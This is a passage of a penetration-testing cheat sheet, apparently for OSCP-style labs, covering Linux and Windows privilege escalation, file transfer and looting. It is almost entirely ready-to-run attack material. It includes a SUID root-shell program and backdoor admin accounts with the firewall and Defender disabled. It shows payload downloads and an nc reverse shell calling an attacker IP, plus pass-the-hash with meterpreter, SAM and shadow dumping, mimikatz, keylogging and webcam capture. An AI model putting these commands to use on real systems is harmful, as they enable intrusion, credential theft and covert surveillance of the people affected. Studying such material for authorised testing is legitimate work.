
#### Bad path configuration

Require user interaction

#### Find plain passwords

```text
grep -rnw '/' -ie 'pass' --color=always
grep -rnw '/' -ie 'DB_PASS' --color=always
grep -rnw '/' -ie 'DB_PASSWORD' --color=always
grep -rnw '/' -ie 'DB_USER' --color=always
```

#### Scripts

**SUID**

```text
int main(void){
  setresuid(0, 0, 0);
  system("/bin/bash");
}

# Compile
gcc suid.c -o suid
```

**PS Monitor for cron**

```text
#!/bin/bash

# Loop by line
IFS=$'\n'

old_process=$(ps -eo command)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
    sleep 1
    old_process=$new_process
done
```

#### Linux Privesc Tools

* [GTFOBins](https://gtfobins.github.io/)
* [LinEnum](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
* [LinuxExploitSuggester](https://gitlab.com/kalilinux/packages/linux-exploit-suggester/blob/kali/master/Linux_Exploit_Suggester.pl)
* [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)

#### Linux Precompiled Exploits

* [kernel-exploits](https://github.com/lucyoa/kernel-exploits)

### Windows

Now we start the whole enumeration-process over gain. This is a checklist. You need to check of every single one, in this order.

* Kernel exploits
* Cleartext password
* Reconfigure service parameters
* Inside service
* Program running as root
* Installed software
* Scheduled tasks
* Weak passwords

#### Basic info

```text
systeminfo
set
hostname
net users
net user user1
net localgroups
accesschk.exe -uwcqv "Authenticated Users" *

netsh firewall show state
netsh firewall show config

# Set path
set PATH=%PATH%;C:\xampp\php

whoami /priv

dir/a -> Show hidden & unhidden files
dir /Q -> Show permissions
```

#### Kernel exploits

```text
# Look for hotfixes
systeminfo

wmic qfe get Caption,Description,HotFixID,InstalledOn

# Search for exploits
site:exploit-db.com windows XX XX
```

#### Cleartext passwords

```text
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

#### Reconfigure service parameters

* Unquoted service paths
* Weak service permissions

[https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)

#### Dump process for passwords

```text
# Looking for Firefox
Get-Process
./procdump64.exe -ma $PID-FF
Select-String -Path .\*.dmp -Pattern 'password' > 1.txt
type 1.txt | findstr /s /i "admin"
```

#### Inside service

Check netstat to see what ports are open from outside and from inside. Look for ports only available on the inside.

```text
# Meterpreter
run get_local_subnets

netstat /a
netstat -ano
```

#### Programs running as root/system

#### Installed software

```text
# Metasploit
ps

tasklist /SVC
net start
reg query HKEY_LOCAL_MACHINE\SOFTWARE
DRIVERQUERY

Look in:
C:\Program files
C:\Program files (x86)
Home directory of the user
```

#### Scheduled tasks

```text
schtasks /query /fo LIST /v

Check this file:
c:\WINDOWS\SchedLgU.Txt
```

#### Weak passwords

Remote desktop

```text
ncrack -vv --user george -P /root/oscp/passwords.txt rdp://10.11.1.111
```

#### Add user and enable RDP

```text
# Add new user

net user haxxor Haxxor123 /add
net localgroup Administrators haxxor /add
net localgroup "Remote Desktop Users" haxxor /ADD

# Turn firewall off and enable RDP

sc stop WinDefend
netsh advfirewall show allprofiles
netsh advfirewall set allprofiles state off
netsh firewall set opmode disable
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

#### Powershell sudo for Windows

```text
$pw= convertto-securestring "EnterPasswordHere" -asplaintext -force
$pp = new-object -typename System.Management.Automation.PSCredential -argumentlist "EnterDomainName\EnterUserName",$pw
$script = "C:\Users\EnterUserName\AppData\Local\Temp\test.bat"
Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process $script -verb Runas}'

powershell -ExecutionPolicy Bypass -File xyz.ps1
```

#### Windows download with bitsadmin

```text
bitsadmin /transfer mydownloadjob /download /priority normal http://<attacker10.11.1.111>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe
```

#### Windows download with certutil.exe

```text
certutil.exe -urlcache -split -f "http://10.11.1.111/Powerless.bat" Powerless.bat
```

#### Windows download with powershell

```text
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.1.111/file.exe','C:\Users\user\Desktop\file.exe')"

(New-Object System.Net.WebClient).DownloadFile("http://10.11.1.111/CLSID.list","C:\Users\Public\CLSID.list")
```

#### Windows Download from FTP

```text
# In reverse shell
echo open 10.11.1.111 > ftp.txt
echo USER anonymous >> ftp.txt
echo ftp >> ftp.txt 
echo bin >> ftp.txt
echo GET file >> ftp.txt
echo bye >> ftp.txt

# Execute
ftp -v -n -s:ftp.txt
```

#### Windows create SMB Server transfer files

```bash
# Attack machine
python /usr/share/doc/python-impacket/examples/smbserver.py Lab "/root/labs/public/10.11.1.111"

# Victim machine with reverse shell
Download: copy \\10.11.1.111\Lab\wce.exe . 
Upload: copy wtf.jpg \\10.11.1.111\Lab
```

#### Windows download with VBS

```text
# In reverse shell
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

# Execute
cscript wget.vbs http://10.11.1.111/file.exe file.exe
```

#### Windowss XP SP1 PrivEsc

```bash
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 10.11.1.111 4343 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
sc config upnphost depend= ""
net start upnphost
```

#### Pass The Hash

```text
# Login as user only with hashdump
# From this hashdump
# admin2:1000:aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7:::

msf5 > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target address range or CIDR identifier
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCR10.11.1.111TION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf5 exploit(windows/smb/psexec) > set rhosts 10.10.0.100
rhosts => 10.10.0.100

msf5 exploit(windows/smb/psexec) > set smbuser admin2

smbuser => admin2

msf5 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7

smbpass => aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7

msf5 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp

payload => windows/x64/meterpreter/reverse_tcp
```

#### Scripts

**Useradd**

```text
#include <stdlib.h> /* system, NULL, EXIT_FAILURE */

int main ()
{
  int i;
  i=system ("net user <username> <password> /add && net localgroup administrators <username> /add");
  return 0;
}

# Compile
i686-w64-mingw32-gcc -o useradd.exe useradd.c
```

**Powershell Run As**

```text
echo $username = '<username>' > runas.ps1
echo $securePassword = ConvertTo-SecureString "<password>" -AsPlainText -Force >> runas.ps1
echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential >> runas.ps1
```

#### Windows privesc/enum tools

* [windows-exploit-suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)
* [windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
* [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)

#### Windows precompiled exploits

* [WindowsExploits](https://github.com/abatchy17/WindowsExploits)

## **Loot**

### Linux

**Checklist**

* Proof:
* Network secret:
* Passwords and hashes:
* Dualhomed:
* Tcpdump:
* Interesting files:
* Databases:
* SSH-keys:
* Browser:
* Mail:

#### Proof

```text
echo -e '\n'HOSTNAME:   && hostname && echo -e '\n'WHOAMI:   && whoami && echo -e '\n'PROOF:  && cat proof.txt && echo -e '\n'IFCONFIG:  && /sbin/ifconfig && echo -e '\n'PASSWD:  && cat /etc/passwd && echo -e '\n'SHADOW:  && cat /etc/shadow && echo -e '\n'NETSTAT:  && netstat -antup
```

#### Network secret

```text
/root/network-secret.txt
```

#### Passwords and hashes

```text
cat /etc/passwd
cat /etc/shadow

unshadow passwd shadow > unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

#### Dualhomed

```text
ifconfig
ifconfig -a
arp -a
```

#### Tcpdump

```text
tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not 10.11.1.111 and dst not 10.11.1.111
tcpdump -vv -i eth0 src not 10.11.1.111 and dst not 10.11.1.111
```

#### Interesting files

```text
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql
use auxiliary/sniffer/psnuffle

.ssh:
.bash_history
```

#### Databases

#### SSH-Keys

#### Browser

#### Mail

```text
/var/mail
/var/spool/mail
```

#### GUI

If there is a gui we want to check out the browser.

```text
echo $DESKTOP_SESSION
echo $XDG_CURRENT_DESKTOP
echo $GDMSESSION
```

### Windows

#### Proof

```text
hostname && whoami.exe && type proof.txt && ipconfig /all
```

#### Passwords and hashes

```text
wce32.exe -w
wce64.exe -w
fgdump.exe

# Loot passwords without tools
reg.exe save hklm\sam c:\sam_backup
reg.exe save hklm\security c:\security_backup
reg.exe save hklm\system c:\system

# Meterpreter
hashdump
load mimikatz
msv
```

#### Dualhomed

```text
ipconfig /all
route print

# What other machines have been connected
arp -a
```

#### Tcpdump

```text
# Meterpreter
run packetrecorder -li
run packetrecorder -i 1
```

#### Interesting files

```text
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql
hashdump
keysscan_start
keyscan_dump
keyscan_stop
webcam_snap

# How to cat files in meterpreter
cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt

# Recursive search
dir /s
```

